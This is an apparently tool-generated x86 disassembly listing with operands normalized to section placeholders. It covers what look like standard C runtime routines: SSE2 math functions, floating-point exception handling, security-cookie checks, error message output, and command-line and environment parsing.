stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4292bb
pop ecx
pop ecx
pop edi
cmp eax 0x1
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
or eax 0xffffffff
mov edx eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
sub_4293f0
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
sub esp 0x8
movq [ esp ] xmm0
call sub_435dcf
fstp [ esp ]
movq xmm0 [ esp ]
add esp 0x8
retn
pextrw eax xmm0 0x3
and ax 0x7fff
sub ax 0x3030
cmp ax 0x10c5
ja r-xdata
jg r-xdata
movlpd xmm1 [ r--data ]
mulsd xmm1 xmm0
movlpd xmm2 [ r--data ]
cvtsd2si edx xmm1
addsd xmm1 xmm2
movlpd xmm3 [ r--data ]
subsd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm1
unpcklpd xmm1 xmm1
add edx 0x1c7610
movsd xmm4 xmm0
and edx 0x3f
movapd xmm5 [ r--data ]
lea eax [ r--data ]
shl edx 0x5
add eax edx
mulpd xmm2 xmm1
subsd xmm0 xmm3
mulsd xmm1 [ r--data ]
subsd xmm4 xmm3
movlpd xmm7 [ eax + 0x8 ]
unpcklpd xmm0 xmm0
movsd xmm3 xmm4
subsd xmm4 xmm2
mulpd xmm5 xmm0
subpd xmm0 xmm2
movapd xmm6 [ r--data ]
mulsd xmm7 xmm4
subsd xmm3 xmm4
mulpd xmm5 xmm0
mulpd xmm0 xmm0
subsd xmm3 xmm2
movapd xmm2 [ eax ]
subsd xmm1 xmm3
movlpd xmm3 [ eax + 0x18 ]
addsd xmm2 xmm3
subsd xmm7 xmm2
mulsd xmm2 xmm4
mulpd xmm6 xmm0
mulsd xmm3 xmm4
mulpd xmm2 xmm0
mulpd xmm0 xmm0
addpd xmm5 [ r--data ]
mulsd xmm4 [ eax ]
addpd xmm6 [ r--data ]
mulpd xmm5 xmm0
movsd xmm0 xmm3
addsd xmm3 [ eax + 0x8 ]
mulsd xmm1 xmm7
movsd xmm7 xmm4
addsd xmm4 xmm3
addpd xmm6 xmm5
movlpd xmm5 [ eax + 0x8 ]
subsd xmm5 xmm3
subsd xmm3 xmm4
addsd xmm1 [ eax + 0x10 ]
mulpd xmm6 xmm2
addsd xmm5 xmm0
addsd xmm3 xmm7
addsd xmm1 xmm5
addsd xmm1 xmm3
addsd xmm1 xmm6
unpckhpd xmm6 xmm6
addsd xmm1 xmm6
addsd xmm4 xmm1
movapd xmm0 xmm4
retn
pextrw eax xmm0 0x3
and ax 0x7fff
pinsrw xmm0 eax 0x3
movlpd xmm1 [ r--data ]
subsd xmm1 xmm0
movapd xmm0 xmm1
retn
sub_4295b0
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
sub esp 0x8
movq [ esp ] xmm0
call sub_435eff
fstp [ esp ]
movq xmm0 [ esp ]
add esp 0x8
retn
pextrw eax xmm0 0x3
and ax 0x7fff
sub ax 0x3030
cmp ax 0x10c5
ja r-xdata
jg r-xdata
movlpd xmm1 [ r--data ]
mulsd xmm1 xmm0
movlpd xmm2 [ r--data ]
cvtsd2si edx xmm1
addsd xmm1 xmm2
movlpd xmm3 [ r--data ]
subsd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm1
unpcklpd xmm1 xmm1
add edx 0x1c7600
movsd xmm4 xmm0
and edx 0x3f
movapd xmm5 [ r--data ]
lea eax [ r--data ]
shl edx 0x5
add eax edx
mulpd xmm2 xmm1
subsd xmm0 xmm3
mulsd xmm1 [ r--data ]
subsd xmm4 xmm3
movlpd xmm7 [ eax + 0x8 ]
unpcklpd xmm0 xmm0
movsd xmm3 xmm4
subsd xmm4 xmm2
mulpd xmm5 xmm0
subpd xmm0 xmm2
movapd xmm6 [ r--data ]
mulsd xmm7 xmm4
subsd xmm3 xmm4
mulpd xmm5 xmm0
mulpd xmm0 xmm0
subsd xmm3 xmm2
movapd xmm2 [ eax ]
subsd xmm1 xmm3
movlpd xmm3 [ eax + 0x18 ]
addsd xmm2 xmm3
subsd xmm7 xmm2
mulsd xmm2 xmm4
mulpd xmm6 xmm0
mulsd xmm3 xmm4
mulpd xmm2 xmm0
mulpd xmm0 xmm0
addpd xmm5 [ r--data ]
mulsd xmm4 [ eax ]
addpd xmm6 [ r--data ]
mulpd xmm5 xmm0
movsd xmm0 xmm3
addsd xmm3 [ eax + 0x8 ]
mulsd xmm1 xmm7
movsd xmm7 xmm4
addsd xmm4 xmm3
addpd xmm6 xmm5
movlpd xmm5 [ eax + 0x8 ]
subsd xmm5 xmm3
subsd xmm3 xmm4
addsd xmm1 [ eax + 0x10 ]
mulpd xmm6 xmm2
addsd xmm5 xmm0
addsd xmm3 xmm7
addsd xmm1 xmm5
addsd xmm1 xmm3
addsd xmm1 xmm6
unpckhpd xmm6 xmm6
addsd xmm1 xmm6
addsd xmm4 xmm1
movapd xmm0 xmm4
retn
shr ax 0x4
cmp ax 0xcfd
jne r-xdata
movlpd xmm3 [ r--data ]
mulsd xmm3 xmm0
subsd xmm3 xmm0
mulsd xmm3 [ r--data ]
retn
mulsd xmm0 [ r--data ]
retn
sub_429780
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
movq [ esp ] xmm0
call sub_4361f4
fstp [ esp ]
movq xmm0 [ esp ]
add esp 0x8
retn
fnstcw [ esp ]
movzx eax [ esp ]
and eax 0x7f
cmp eax 0x7f
jne r-xdata
pextrw eax xmm0 0x3
mov ecx eax
and eax 0x7ff0
cmp eax 0x7ff0
je r-xdata
mov eax ecx
and eax 0xf
jne r-xdata
mov eax ecx
and eax 0x8000
jne r-xdata
movq [ esp ] xmm0
or [ esp + 0x6 ] 0x8
mov edx 0x3f5
jmp r-xdata
pextrw eax xmm0 0x2
and eax 0xffff
jne r-xdata
movq [ esp ] xmm0
cmp [ esp ] 0x0
jne r-xdata
sqrtsd xmm0 xmm0
add esp 0x8
retn
sub esp 0x10
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x10
mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_435f92
movlpd xmm0 [ esp + 0x10 ]
add esp 0x18
retn
pextrw eax xmm0 0x1
and eax 0xffff
jne r-xdata
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0xfff80000
mov edx 0x31
cmp ecx 0x8000
jne r-xdata
pextrw eax xmm0 0x0
and eax 0xffff
je r-xdata
pextrw eax xmm0 0x2
cmp eax 0x0
jne r-xdata
jmp r-xdata
sub_4298ae
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_4298ef
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_429937
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_42997b
mov esi eax
test esi esi
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
sub_42997b
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
push 0x0
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx esi
and ecx 0x1f
xor esi [ rw-data ]
ror esi cl
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4299c4
mov eax esi
call sub_40d2b6
retn
sub_4299cd
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
push 0x0
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx esi
and ecx 0x1f
xor esi [ rw-data ]
ror esi cl
mov [ ebp - 0x1c ] esi
push [ ebp + 0x8 ]
call sub_4298ae
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_429a24
mov eax esi
call sub_40d2b6
retn
sub_429a38
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x90 ]
cmp eax ecx
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
pop ebp
retn
add eax 0xc
cmp eax ecx
jne r-xdata
cmp [ eax ] edx
je r-xdata
sub_429a5c
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
je r-xdata
push [ ebp + 0xc ]
push eax
call sub_429a7c
pop ecx
pop ecx
pop ebp
retn
xor eax eax
pop ebp
retn
sub_429a7c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_430b02
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov ecx edx
push ebx
xor ebx ebx
push edi
lea eax [ edx + 0x90 ]
cmp edx eax
je r-xdata
mov ecx ebx
mov edi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
mov edi [ ecx + 0x8 ]
test edi edi
jne r-xdata
test ecx ecx
je r-xdata
add ecx 0xc
cmp ecx eax
jne r-xdata
pop edi
pop ebx
cmp edi 0x5
jne r-xdata
cmp [ ecx ] edi
je r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ecx + 0x8 ] ebx
inc eax
jmp r-xdata
or eax 0xffffffff
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
push [ ecx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx edi
call [ r--data ]
call edi
lea eax [ edx + 0x24 ]
lea edx [ eax + 0x6c ]
jmp r-xdata
cmp eax edx
jne r-xdata
mov [ eax + 0x8 ] ebx
add eax 0xc
mov ebx [ esi + 0x8 ]
mov eax 0xc0000091
cmp [ ecx ] eax
ja r-xdata
cmp [ ecx ] 0xc0000092
je r-xdata
je r-xdata
mov [ esi + 0x8 ] 0x8a
cmp [ ecx ] 0xc0000093
je r-xdata
mov [ esi + 0x8 ] 0x84
jmp r-xdata
cmp [ ecx ] 0xc000008d
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc00002b4
je r-xdata
push [ esi + 0x8 ]
mov ecx edi
push 0x8
call [ r--data ]
call edi
pop ecx
mov [ esi + 0x8 ] ebx
jmp r-xdata
mov [ esi + 0x8 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc000008e
je r-xdata
mov [ esi + 0x8 ] 0x8e
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x8 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc000008f
je r-xdata
mov [ esi + 0x8 ] 0x8d
jmp r-xdata
mov [ esi + 0x8 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x8 ] 0x81
jmp r-xdata
sub_429bf2
push 0x3
call sub_43629a
pop ecx
cmp eax 0x1
jne r-xdata
test eax eax
jne r-xdata
mov al 0x1
retn
xor al al
retn
cmp [ rw-data ] 0x1
je r-xdata
sub_429c12
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
cmp esi 0xffffffff
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x1f8 ]
xor eax eax
push eax
mov [ ebp - 0x5 ] al
mov [ ebp - 0x1fc ] eax
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
sub ecx eax
dec ecx
push ecx
push eax
push esi
call [ WriteFile@IAT ]
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
mov al [ edx ]
mov [ ecx ] al
inc ecx
lea eax [ ebp - 0x4 ]
cmp ecx eax
je r-xdata
sub_429c8f
mov edi edi
push ebp
mov ebp esp
push 0x3
call sub_43629a
pop ecx
cmp eax 0x1
je r-xdata
pop ebp
jmp sub_429c12
test eax eax
jne r-xdata
push ebx
push esi
push r--data
push 0x314
mov ebx rw-data
push ebx
call sub_436420
add esp 0xc
xor esi esi
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_430e5d
int3
push edi
push 0x104
push rw-data
push esi
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov edi 0x2fb
test eax eax
jne r-xdata
mov ecx rw-data
lea edx [ ecx + 0x2 ]
push r--data
push edi
push rw-data
call sub_436420
add esp 0xc
test eax eax
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax si
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
cmp eax 0x3c
jbe r-xdata
push r--data
mov edi 0x314
push edi
push ebx
call sub_43634b
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ ecx * 2 + rw-data ]
mov eax ecx
sub eax rw-data
push 0x3
sar eax 0x1
push r--data
sub edi eax
push edi
push ecx
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_43634b
add esp 0xc
pop edi
test eax eax
jne r-xdata
push 0x12010
push r--data
push ebx
call sub_4368ae
add esp 0xc
pop esi
pop ebx
pop ebp
retn
sub_429dae
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_430e5d
int3
pop ebp
retn
sub_429dfb
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_429e1a
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_429e7b
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ rw-data ]
mov ecx esi
xor esi [ rw-data ]
and ecx 0x1f
ror esi cl
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
pop ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
sub_429f0f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x2
push esi
je r-xdata
push ebx
push edi
call sub_437a77
push 0x104
mov esi rw-data
xor edi edi
push esi
push edi
call [ GetModuleFileNameA@IAT ]
mov ebx [ rw-data ]
mov [ rw-data ] esi
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x1
je r-xdata
mov ebx esi
cmp [ ebx ] 0x0
jne r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push ebx
call sub_42a186
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
call sub_430f56
push 0xc
pop edi
mov [ eax ] edi
jmp r-xdata
lea eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] edi
push eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] edi
push eax
push edi
push edi
push ebx
call sub_42a186
push 0x1
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
call sub_42a60b
mov esi eax
add esp 0x20
test esi esi
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push esi
call sub_437541
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ rw-data ] eax
mov eax esi
mov esi edi
mov [ rw-data ] eax
mov ebx edi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax edx
cmp [ edx ] edi
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
push esi
call sub_42d3b1
pop ecx
pop edi
mov eax ebx
pop ebx
mov eax edi
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] eax
mov ebx edi
mov [ rw-data ] edx
lea eax [ eax + 0x4 ]
inc ecx
cmp [ eax ] edi
jne r-xdata
push eax
call sub_42d3b1
pop ecx
mov [ ebp - 0x8 ] edi
sub_42a033
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x2
push esi
je r-xdata
push ebx
push edi
push 0x104
mov esi rw-data
xor edi edi
push esi
push edi
call [ GetModuleFileNameW@IAT ]
mov ebx [ rw-data ]
mov [ rw-data ] esi
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x1
je r-xdata
mov ebx esi
cmp [ ebx ] di
jne r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push ebx
call sub_42a2fb
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
call sub_430f56
push 0xc
pop edi
mov [ eax ] edi
jmp r-xdata
lea eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] edi
push eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] edi
push eax
push edi
push edi
push ebx
call sub_42a2fb
push 0x2
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
call sub_42a60b
mov esi eax
add esp 0x20
test esi esi
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push esi
call sub_43754c
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ rw-data ] eax
mov eax esi
mov esi edi
mov [ rw-data ] eax
mov ebx edi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax edx
cmp [ edx ] edi
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
push esi
call sub_42d3b1
pop ecx
pop edi
mov eax ebx
pop ebx
mov eax edi
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] eax
mov ebx edi
mov [ rw-data ] edx
lea eax [ eax + 0x4 ]
inc ecx
cmp [ eax ] edi
jne r-xdata
push eax
call sub_42d3b1
pop ecx
mov [ ebp - 0x8 ] edi
sub_42a186
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
and [ ebx ] 0x0
mov edi [ ebp + 0x10 ]
mov [ eax ] 0x1
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
xor cl cl
mov [ ebp - 0x1 ] cl
mov [ eax ] edi
add eax 0x4
mov [ ebp + 0xc ] eax
inc [ ebx ]
test edi edi
je r-xdata
test cl cl
mov al 0x22
sete cl
inc esi
mov [ ebp - 0x1 ] cl
jmp r-xdata
mov al [ esi ]
inc esi
mov [ ebp - 0x2 ] al
movsx eax al
push eax
call sub_43803a
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
test cl cl
jne r-xdata
mov al [ ebp - 0x2 ]
test al al
je r-xdata
inc [ ebx ]
test edi edi
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x20
je r-xdata
dec esi
mov cl [ ebp - 0x1 ]
inc esi
mov al [ esi ]
mov [ edi ] al
inc edi
test edi edi
je r-xdata
cmp al 0x9
jne r-xdata
mov ecx [ ebp + 0xc ]
pop edi
pop esi
pop ebx
test ecx ecx
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov [ edi - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
mov esp ebp
pop ebp
retn
and [ ecx ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
mov [ ecx ] edi
add ecx 0x4
mov [ ebp + 0xc ] ecx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc eax
cmp [ esi ] 0x22
jne r-xdata
test eax eax
jne r-xdata
test al 0x1
jne r-xdata
dec eax
test edi edi
je r-xdata
mov al [ esi ]
test al al
je r-xdata
shr eax 0x1
jmp r-xdata
mov cl [ ebp - 0x1 ]
test cl cl
je r-xdata
inc [ ebx ]
mov [ edi ] 0x5c
inc edi
test edi edi
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
xor edx edx
test cl cl
sete [ ebp - 0x1 ]
lea ecx [ esi + 0x1 ]
cmp [ ecx ] 0x22
jne r-xdata
inc [ ebx ]
jmp r-xdata
mov [ edi ] 0x0
inc edi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov cl [ ebp - 0x1 ]
mov esi ecx
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
test edi edi
je r-xdata
cmp al 0x9
je r-xdata
xor edx edx
inc edx
xor eax eax
jmp r-xdata
movsx eax [ esi ]
push eax
call sub_43803a
pop ecx
test eax eax
je r-xdata
mov [ edi ] al
inc edi
inc [ ebx ]
inc esi
inc [ ebx ]
test edi edi
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
sub_42a2fb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x18 ]
mov [ edi ] ebx
mov [ eax ] 0x1
test esi esi
je r-xdata
mov [ ebp - 0x8 ] 0x20
mov [ ebp - 0xc ] 0x9
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
inc [ edi ]
test edx edx
je r-xdata
test bl bl
sete bl
add ecx 0x2
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
test ax ax
je r-xdata
mov ax [ ecx ]
mov [ edx ] ax
add edx 0x2
test bl bl
jne r-xdata
sub ecx 0x2
push 0x22
pop eax
cmp ax [ ebp - 0x8 ]
je r-xdata
test esi esi
je r-xdata
movzx eax [ ecx ]
cmp ax [ ebp - 0x8 ]
je r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0xc ]
push 0x22
pop eax
jne r-xdata
inc [ ebx ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi ] eax
add ecx 0x2
jmp r-xdata
cmp ax [ ebp - 0xc ]
jne r-xdata
mov ebx [ ebp + 0x14 ]
xor eax eax
mov [ ebp - 0x1 ] al
xor eax eax
mov [ edx - 0x2 ] ax
jmp r-xdata
cmp [ ecx ] ax
jne r-xdata
xor eax eax
cmp [ ecx ] ax
je r-xdata
test esi esi
je r-xdata
inc [ ebx ]
xor ebx ebx
push 0x5c
pop esi
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
cmp [ ecx ] si
je r-xdata
add ecx 0x2
inc eax
push 0x22
pop esi
cmp [ ecx ] si
push 0x5c
pop esi
jne r-xdata
test eax eax
jne r-xdata
test al 0x1
jne r-xdata
dec eax
test edx edx
je r-xdata
movzx eax [ ecx ]
test ax ax
je r-xdata
mov edi [ ebp + 0x18 ]
shr eax 0x1
jmp r-xdata
cmp [ ebp - 0x1 ] bl
je r-xdata
inc [ edi ]
mov [ edx ] si
add edx 0x2
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
test edx edx
je r-xdata
cmp [ ebp - 0x1 ] bl
jne r-xdata
cmp [ ebp - 0x1 ] bl
mov [ ebp - 0x10 ] ebx
sete [ ebp - 0x1 ]
push 0x22
pop esi
cmp [ ecx + 0x2 ] si
push 0x5c
pop esi
jne r-xdata
inc [ edi ]
xor eax eax
jmp r-xdata
xor eax eax
mov [ edx ] ax
add edx 0x2
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp ax [ ebp - 0x8 ]
je r-xdata
add ecx 0x2
jmp r-xdata
cmp [ ecx ] ax
je r-xdata
add ecx 0x2
jmp r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0xc ]
je r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax ebx
jmp r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
sub_42a60b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0x3fffffff
jb r-xdata
push edi
or edi 0xffffffff
mov ecx [ ebp + 0xc ]
xor edx edx
mov eax edi
div [ ebp + 0x10 ]
cmp ecx eax
jae r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
imul ecx [ ebp + 0x10 ]
shl esi 0x2
sub edi esi
cmp edi ecx
ja r-xdata
pop esi
pop ebp
retn
pop edi
lea eax [ ecx + esi ]
push 0x1
push eax
call sub_42d49d
push 0x0
mov esi eax
call sub_42d3b1
add esp 0xc
mov eax esi
sub_42a6ce
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
cmp [ rw-data ] eax
jne r-xdata
call sub_42a72c
test eax eax
jne r-xdata
xor eax eax
retn
call sub_42aa87
neg eax
sbb eax eax
not eax
and eax [ rw-data ]
sub_42a6fd
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
cmp [ rw-data ] eax
jne r-xdata
call sub_42a785
test eax eax
jne r-xdata
xor eax eax
retn
call sub_42ab06
neg eax
sbb eax eax
not eax
and eax [ rw-data ]
sub_42a72c
cmp [ rw-data ] 0x0
je r-xdata
push esi
push edi
call sub_437a77
call sub_438249
mov esi eax
test esi esi
jne r-xdata
xor eax eax
retn
push esi
call sub_42a854
pop ecx
test eax eax
jne r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
mov ecx rw-data
mov [ rw-data ] eax
call sub_42adb7
xor edi edi
or edi 0xffffffff
jmp r-xdata
push esi
call sub_42d3b1
pop ecx
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_42d3b1
pop ecx
sub_42a785
cmp [ rw-data ] 0x0
je r-xdata
push esi
push edi
call sub_4382cc
mov esi eax
test esi esi
jne r-xdata
xor eax eax
retn
push esi
call sub_42a925
pop ecx
test eax eax
jne r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
mov ecx rw-data
mov [ rw-data ] eax
call sub_42ade8
xor edi edi
or edi 0xffffffff
jmp r-xdata
push esi
call sub_42d3b1
pop ecx
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_42d3b1
pop ecx
sub_42a7d9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor edx edx
mov al [ esi ]
test al al
je r-xdata
mov eax edx
pop esi
pop ebp
retn
push edi
mov ecx esi
lea edi [ ecx + 0x1 ]
inc edx
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
inc esi
add esi ecx
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x3d
je r-xdata
pop edi
sub_42a80d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov edx ebx
movzx eax [ esi ]
test ax ax
je r-xdata
